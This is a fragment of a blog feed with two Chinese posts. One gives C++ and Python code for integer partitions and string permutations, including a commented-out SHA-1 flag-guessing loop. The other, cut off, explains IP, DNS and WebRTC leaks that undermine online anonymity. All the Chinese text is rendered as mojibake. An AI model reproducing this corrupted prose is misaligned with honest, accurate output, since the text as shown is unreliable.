function">sort_string</span><span class="token punctuation">(</span>string it<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    string tmp <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">get_set</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> atree<span class="token punctuation">)</span><span class="token punctuation">{</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>atree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">sort_string</span><span class="token punctuation">(</span>atree<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    cin<span class="token operator">>></span>num<span class="token punctuation">;</span>    <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂéªÈáçÂ§ÑÁêÜ </span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> result <span class="token operator">=</span> <span class="token function">get_set</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>it<span class="token punctuation">)</span><span class="token punctuation">{</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//    for(int i=0;i&lt;tree.size();++i){</span><span class="token comment" spellcheck="true">//        cout&lt;&lt;tree.at(i)&lt;&lt;endl;</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞flagÂèòÈáèÂØπÂ∫îÁöÑÂ∞±ÊòØTreeÁöÑÂàÜÊîØÊÄªÊï∞ÔºåËÄåÈ¢òÁõÆË¶ÅÊ±ÇÁöÑÊòØÊ≤°ÊúâÈáçÂ§çÁªÑÂêàÁöÑÁªìÊûúÔºåÂú®Ê†ëÁöÑÂàÜÊîØ‰∏≠Â≠òÂú®ÈáçÂ§çÁöÑËäÇÁÇπÔºå‰æãÂ¶ÇÊàë‰ª¨Ë¶ÅËé∑Âæó<code>n=5</code>ÁöÑÁªìÊûúÔºåÈÇ£‰πà<code>1-3-1</code>Âíå<code>1-1-3</code>‰∏§‰∏™ÂàÜÊîØÂ∞±‰∫ßÁîü‰∫ÜÈáçÂ§çÔºåÊ≠§Êó∂ÂØπÊ†ëÁöÑÂàÜÊîØËøõË°åÁªìÁÇπÊéíÂ∫èÔºåÁÑ∂ÂêéÈÄöËøáÈõÜÂêàÂéªÈáçÔºåËøôÊó∂ÂæóÂà∞ÁöÑÊâçÊòØÁúüÊ≠£ÁöÑÁªìÊûú„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>Â¶ÇÊûú<code>di_gui</code>‰∏çÁî®ÂÖ®Â±ÄÂèòÈáèflagÁöÑËØùÔºåÂèØ‰ª•ÊääflagÊîæÂÖ•ÊñπÊ≥ï‰∏≠Ôºö</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">+</span><span class="token operator">=</span><span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Êâ©Â±ï"><a href="#Êâ©Â±ï" class="headerlink" title="Êâ©Â±ï"></a>Êâ©Â±ï</h2><p>PythonÁâàÂõ∫ÂÆöÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤ÊéíÂàóÁªÑÂêàÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># ËøôÈáåÊòØÈÄíÂΩíÂáΩÊï∞ÁöÑÂá∫Âè£Ôºå‰∏∫‰ªÄ‰πàÂë¢ÔºåÂõ†‰∏∫ËøôÈáåË°®Á§∫Ôºö‰∏Ä‰∏™ÈïøÂ∫¶‰∏∫1ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂÆÉÁöÑÊéíÂàóÁªÑÂêàÂ∞±ÊòØÂÆÉËá™Â∑±„ÄÇ</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#‰øùÂ≠òÂ≠óÁ¨¶‰∏≤ÁöÑÊâÄÊúâÂèØËÉΩÊéíÂàóÁªÑÂêà</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#Ëøô‰∏™Âæ™ÁéØÔºåÂØπÂ∫î Ëß£È¢òÊÄùË∑Ø1ÔºâÁ°ÆÂÆöÂ≠óÁ¨¶‰∏≤ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÊØçÊòØË∞ÅÔºåÊúânÁßçÂèØËÉΩÔºàn‰∏∫Â≠óÁ¨¶‰∏≤sÁöÑÈïøÂ∫¶</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#Ëøô‰∏™Âæ™ÁéØÔºåÂØπÂ∫î Ëß£È¢òÊÄùË∑Ø2ÔºâËøõÂÖ•ÈÄíÂΩíÔºås[0:i]+s[i+1:]ÁöÑÊÑèÊÄùÂ∞±ÊòØÊääs‰∏≠ÁöÑs[i]ÁªôÂéªÊéâ</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ÂØπÂ∫î Ëß£È¢òÊÄùË∑Ø2ÔºâÈóÆÈ¢òÂ∞±‰ªé‚ÄúËøîÂõûÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÂ≠óÊØçÊéíÂàóÁªÑÂêà‚Äù **ÂèòÊàê‰∫Ü** ‚ÄúËøîÂõû Á¨¨‰∏Ä‰∏™Â≠óÊØç+Èô§ÂéªÁ¨¨‰∏Ä‰∏™Â≠óÊØçÂ§ñÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÊéíÂàóÁªÑÂêà‚Äù</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#Ë¶ÅÊéíÂàóÁªÑÂêàÁöÑÂ≠óÁ¨¶</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>ÂêåÊ†∑ÊòØÈÄíÂΩíÔºãTreeÁöÑÊñπÊ≥ïËé∑ÂèñÂà∞ÁªìÊûú„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IPÂåøÂêçÊÄßÁ†îÁ©∂</title>
      <link href="/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/"/>
      <url>/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity</p><a id="more"></a><h1 id="IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity"><a href="#IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity" class="headerlink" title="IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity"></a>IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity</h1><h2 id="‰ΩïË∞ìÂåøÂêçÔºü"><a href="#‰ΩïË∞ìÂåøÂêçÔºü" class="headerlink" title="‰ΩïË∞ìÂåøÂêçÔºü"></a>‰ΩïË∞ìÂåøÂêçÔºü</h2><blockquote><p>ÂåøÂêçÂÆö‰πâ‰∏∫<strong>Êú™Áü•ÂßìÂêçÊàñÊú™Á°ÆÂÆöË∫´‰ªΩ</strong>„ÄÇÊàë‰ª¨‰∏äÁΩëÊó∂Âπ∂Ê≤°ÊúâÂåøÂêçÔºåÂç≥‰ΩøÂú®‰ΩøÁî®ÈöêÁßÅÂ∑•ÂÖ∑Â¶ÇTor„ÄÅBitcoinÊàñVPNÁöÑÊó∂ÂÄô„ÄÇÊØèÈ°πÊúçÂä°Ëá≥Â∞ëÊúâ‰∏ÄÊù°ÂèØ‰ª•Áî®‰∫éÂå∫ÂàÜ‰∏çÂêåÁî®Êà∑ÁöÑ‰ø°ÊÅØÔºåÊó†ËÆ∫ÂÖ∂‰∏∫‰∏ÄÂ•óIPÂú∞ÂùÄÔºàVPNÊàñTorÔºâËøòÊòØ‰∏Ä‰∏™ÁîµÂ≠êÈí±ÂåÖÔºàBitcoinÔºâ„ÄÇËøôÁßç‰ø°ÊÅØÊú¨Ë∫´ÂèØËÉΩ‰∏ç‰ºöÊ≥ÑÈú≤Áî®Êà∑ÁöÑ‰ªª‰ΩïÁßÅ‰∫∫‰ø°ÊÅØÔºå‰ΩÜÂÖ∂ÂèØ‰∏éÂÖ∂ÂÆÉÁõ∏‰ºº‰ø°ÊÅØËÅîÁ≥ªËµ∑Êù•ÔºåÊúÄÁªàÁ°ÆÂÆö‰∏™‰∫∫ÁöÑË∫´‰ªΩ„ÄÇ</p><p>VPNËôΩÁÑ∂‰∏ç‰ºö‰ΩøÂæóÊàë‰ª¨ÂÆåÂÖ®ÂåøÂêçÔºå‰ΩÜÂÆÉ‰ºöÊûÅÂ§ßÂ¢ûÂº∫‰∏äÁΩëÊó∂ÁöÑÈöêÁßÅÂíåÂÆâÂÖ®„ÄÇ</p></blockquote><p>Êó¢ÁÑ∂‰∏çÂèØËÉΩÂÅöÂà∞ÂÆåÂÖ®ÂåøÂêçÔºåÊàë‰ª¨Âè™ËÉΩÊèêÈ´òÁõ∏ÂØπÂåøÂêçÊÄßÔºå‰ªéËÄå‰ΩøÂæóËá™Â∑±Âú®ÁΩëÁªú‰∏≠ÁöÑ<strong>ÈöêÁßÅÂ∫¶Êõ¥È´ò</strong>Ôºå<strong>ÂÆâÂÖ®ÊÄßÊõ¥È´ò</strong>„ÄÇ</p><h2 id="‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ"><a href="#‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ" class="headerlink" title="‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ"></a>‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ</h2><p>‰∫íËÅîÁΩëÊó∂‰ª£Ôºå‰∏™‰∫∫ÈöêÁßÅÁöÑ‰øùÊä§Êõ¥Âä†Â§çÊùÇ‰∏éÂõ∞ÈöæÔºå‰∫üÂæÖÂêÑÁßç‰øùÊä§ÊâãÊÆµÁöÑÊõ¥Êñ∞ÂíåÂàõÊñ∞„ÄÇÊØîÂ¶ÇÂú®ÁΩëÁªúÁ´ãÊ≥ïÂ±ÇÈù¢ÔºåÁõÆÂâç‰ªçÊúâËÆ∏Â§öÁ©∫ÁôΩÔºåÁº∫‰πèÁõ∏Â∫îÁöÑÈ°∂Â±ÇËÆæËÆ°„ÄÇÊúâÂøÖË¶ÅÂú®‰∏™‰∫∫‰ø°ÊÅØ‰øùÊä§„ÄÅÁîµÂ≠êÂïÜÂä°Á≠âÈ¢ÜÂüüÂª∫Á´ã‰∏•Ê†ºÂÅ•ÂÖ®ÁöÑÊ≥ïÂæãËßÑÂÆöÔºåÂàíÂÆö‰∫íËÅîÁΩëÊúçÂä°ÂïÜÁöÑ‚ÄúÁ¶ÅÂå∫‚ÄùÔºåÊòéÁ°ÆÊùÉË¥£ÔºåËÆ©Â§ÑÂú®Âº±ÂäøÁöÑÊôÆÈÄöÁî®Êà∑Êã•ÊúâÁü•ÊÉÖÊùÉ„ÄÅÈÄâÊã©ÊùÉ‰∏éÁª¥ÊùÉÁöÑ‰æùÊçÆ„ÄÇ</p><p>Âõ†ËÄåÂú®ÂΩì‰ªäËøô‰∏™Êó∂‰ª£Ôºå‰∏çËÆ∫ÊòØ‰ø°ÊÅØ/ÁΩëÁªúÂÆâÂÖ®‰ªé‰∏öËÄÖÔºåËøòÊòØÊôÆÈÄöÁæ§‰ºóÈÉΩÂ∫îËØ•Ëá™‰∏ªÂú∞ÂéªÊèêÈ´òËá™Â∑±ÁöÑÂÆâÂÖ®ÊÑèËØÜÔºåÈÄöËøá‰∏Ä‰∫õÊé™ÊñΩÈò≤Ê≠¢Ëá™Â∑±ÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤„ÄÇ</p><h2 id="‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü"><a href="#‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü" class="headerlink" title="‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü"></a>‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü</h2><p>ÂèØ‰ª•Â∞èÁªìÂá∫‰ª•‰∏ãÂõ†Á¥†Ôºö</p><ul><li>IPV4Âú∞ÂùÄÊ≥ÑÈú≤</li><li>IPV6Âú∞ÂùÄÊ≥ÑÈú≤</li><li>DNSÊ≥ÑÈú≤</li><li>WebRTCÊ≥ÑÈú≤</li><li>HTTPHeader‰ø°ÊÅØÊ≥ÑÈú≤</li><li>Á≠âÁ≠â‚Ä¶..</li></ul><h3 id="IPV4Ê≥ÑÈú≤"><a href="#IPV4Ê≥ÑÈú≤" class="headerlink" title="IPV4Ê≥ÑÈú≤"></a>IPV4Ê≥ÑÈú≤</h3><blockquote><p>IPv4‰ΩøÁî®32‰ΩçÔºà4Â≠óËäÇÔºâÂú∞ÂùÄÔºåÂõ†Ê≠§Âú∞ÂùÄÁ©∫Èó¥‰∏≠Âè™Êúâ4,294,967,296Ôºà232Ôºâ‰∏™Âú∞ÂùÄ„ÄÇ‰∏çËøáÔºå‰∏Ä‰∫õÂú∞ÂùÄÊòØ‰∏∫ÁâπÊÆäÁî®ÈÄîÊâÄ‰øùÁïôÁöÑÔºåÂ¶Ç‰∏ìÁî®ÁΩëÁªúÔºàÁ∫¶1800‰∏á‰∏™Âú∞ÂùÄÔºâÂíåÂ§öÊí≠Âú∞ÂùÄÔºàÁ∫¶2.7‰∫ø‰∏™Âú∞ÂùÄÔºâÔºåËøôÂáèÂ∞ë‰∫ÜÂèØÂú®‰∫íËÅîÁΩë‰∏äË∑ØÁî±ÁöÑÂú∞ÂùÄÊï∞Èáè„ÄÇÈöèÁùÄÂú∞ÂùÄ‰∏çÊñ≠Ë¢´ÂàÜÈÖçÁªôÊúÄÁªàÁî®Êà∑ÔºåIPv4Âú∞ÂùÄÊûØÁ´≠ÈóÆÈ¢ò‰πüÂú®Èöè‰πã‰∫ßÁîü„ÄÇÂü∫‰∫éÂàÜÁ±ªÁΩëÁªú„ÄÅÊó†Á±ªÂà´ÂüüÈó¥Ë∑ØÁî±ÂíåÁΩëÁªúÂú∞ÂùÄËΩ¨Êç¢ÁöÑÂú∞ÂùÄÁªìÊûÑÈáçÊûÑÊòæËëóÂú∞ÂáèÂ∞ë‰∫ÜÂú∞ÂùÄÊûØÁ´≠ÁöÑÈÄüÂ∫¶„ÄÇ‰ΩÜÂú®2011Âπ¥2Êúà3Êó•ÔºåÂú®ÊúÄÂêé5‰∏™Âú∞ÂùÄÂùóË¢´ÂàÜÈÖçÁªô5‰∏™Âå∫Âüü‰∫íËÅîÁΩëÊ≥®ÂÜåÁÆ°ÁêÜÊú∫ÊûÑ‰πãÂêéÔºåIANAÁöÑ‰∏ªË¶ÅÂú∞ÂùÄÊ±†Â∑≤ÁªèÁî®Â∞Ω„ÄÇ</p></blockquote><p>Êàë‰ª¨Áé∞Âú®Â∏∏ËØ¥ÁöÑIPÂú∞ÂùÄÂ∞±ÊòØÊåáIPV4Âú∞ÂùÄÔºåÈÄöÂ∏∏Êàë‰ª¨Âú®‰ΩøÁî®ÊµèËßàÂô®ËÆøÈóÆwebÁ´ôÁÇπÊó∂ÔºåËØ∑Ê±ÇÂ§¥‰∏≠‰ºöÂåÖÂê´Êàë‰ª¨ÁöÑIPV4Âú∞ÂùÄÔºåÂõ†Ê≠§ÂèØ‰ª•Ë¢´ÊúçÂä°Âô®Ëé∑ÂèñÂà∞Êàë‰ª¨ÁöÑIPÂπ∂ËÆ∞ÂΩïËøõÂÖ•Êó•Âøó„ÄÇ</p><h3 id="IPV6Ê≥ÑÈú≤"><a href="#IPV6Ê≥ÑÈú≤" class="headerlink" title="IPV6Ê≥ÑÈú≤"></a>IPV6Ê≥ÑÈú≤</h3><blockquote><p>InternetÂçèËÆÆÁâàÊú¨6ÔºàIPv6ÔºâÊòØInternetÂçèËÆÆÔºàIPÔºâÁöÑÊúÄÊñ∞ÁâàÊú¨ÔºåIPÂçèËÆÆÊòØ‰∏∫ÁΩëÁªú‰∏äÁöÑËÆ°ÁÆóÊú∫Êèê‰æõÊ†áËØÜÂíåÂÆö‰ΩçÁ≥ªÁªüÂπ∂ÈÄöËøáInternetË∑ØÁî±ÊµÅÈáèÁöÑÈÄö‰ø°ÂçèËÆÆ„ÄÇIPv6ÊòØÁî±‰∫íËÅîÁΩëÂ∑•Á®ã‰ªªÂä°ÁªÑÔºàIETFÔºâÂºÄÂèëÁöÑÔºåÁî®‰∫éËß£ÂÜ≥ÈïøÊúü‰ª•Êù•ÁöÑIPv4Âú∞ÂùÄËÄóÂ∞ΩÈóÆÈ¢ò„ÄÇ</p><p>Èô§‰∫ÜÊõ¥Â§ßÁöÑÂØªÂùÄÁ©∫Èó¥‰πãÂ§ñÔºåIPv6ËøòÊèê‰æõÂÖ∂‰ªñÊäÄÊúØ‰ºòÂäø„ÄÇÁâπÂà´ÊòØÔºåÂÆÉÂÖÅËÆ∏ÂàÜÂ±ÇÂú∞ÂùÄÂàÜÈÖçÊñπÊ≥ïÔºåËøô‰∫õÊñπÊ≥ïÊúâÂä©‰∫éË∑®InternetÁöÑ<a href="https://en.wikipedia.org/wiki/Route_aggregation" target="_blank" rel="noopener">Ë∑ØÁî±ËÅöÂêà</a>Ôºå‰ªéËÄåÈôêÂà∂‰∫Ü<a href="https://en.wikipedia.org/wiki/Routing_table" target="_blank" rel="noopener">Ë∑ØÁî±Ë°®</a>ÁöÑÊâ©Â±ï„ÄÇÊâ©Â±ïÂíåÁÆÄÂåñ‰∫ÜÂ§öÊí≠ÂØªÂùÄÁöÑ‰ΩøÁî®ÔºåÂπ∂‰∏∫ÊúçÂä°ÁöÑÊèê‰æõÊèê‰æõ‰∫ÜÈ¢ùÂ§ñÁöÑ‰ºòÂåñ„ÄÇÂú®ÂçèËÆÆÁöÑËÆæËÆ°‰∏≠Â∑≤ÁªèËÄÉËôë‰∫ÜËÆæÂ§áÁßªÂä®ÊÄßÔºåÂÆâÂÖ®ÊÄßÂíåÈÖçÁΩÆÊñπÈù¢„ÄÇ</p><p>IPv6Âú∞ÂùÄË°®Á§∫‰∏∫ÂÖ´ÁªÑÔºåÊØèÁªÑÂõõ‰∏™<a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank" rel="noopener">ÂçÅÂÖ≠ËøõÂà∂</a>Êï∞Â≠óÔºåÁªÑ‰ª•ÂÜíÂè∑ÂàÜÈöîÔºå‰æãÂ¶Ç2001Ôºö0db8Ôºö0000Ôºö0042Ôºö0000Ôºö8a2eÔºö0370Ôºö7334Ôºå‰ΩÜÂ≠òÂú®Áº©ÂÜôÊ≠§ÂÆåÊï¥Á¨¶Âè∑ÁöÑÊñπÊ≥ï„ÄÇ</p></blockquote><p>IPV6ÊòØËøòÊú™ÊôÆÈÅç‰ΩøÁî®ÁöÑ‰∏ÄÁßçÂú∞ÂùÄÔºåÁî®‰∫éËß£ÂÜ≥ÈïøÊúü‰ª•Êù•ÁöÑIPv4Âú∞ÂùÄËÄóÂ∞ΩÈóÆÈ¢òÔºåÈÄöËøáÊ≤°ÊúâÈöêËóèIPV6‰πü‰ºöÊ≥ÑÈú≤Êàë‰ª¨‰ø°ÊÅØ„ÄÇ</p><h3 id="DNSÊ≥ÑÈú≤"><a href="#DNSÊ≥ÑÈú≤" class="headerlink" title="DNSÊ≥ÑÈú≤"></a>DNSÊ≥ÑÈú≤</h3><p>‰ªÄ‰πàÊòØDNS?</p><blockquote><p>DNSÊàñÂüüÂêçÁ≥ªÁªüÁî®‰∫éÂ∞ÜÂüüÂêçÔºàÂ¶Ç<a href="http://www.astrill.comÔºâËΩ¨Êç¢‰∏∫Êï∞Â≠óIPÂú∞ÂùÄÔºå‰æãÂ¶Ç" target="_blank" rel="noopener">www.astrill.comÔºâËΩ¨Êç¢‰∏∫Êï∞Â≠óIPÂú∞ÂùÄÔºå‰æãÂ¶Ç</a> 123.98.12.1Âú®‰∫íËÅîÁΩë‰∏äÁî®‰∫éÂèëÈÄÅÊï∞ÊçÆÂåÖ„ÄÇ 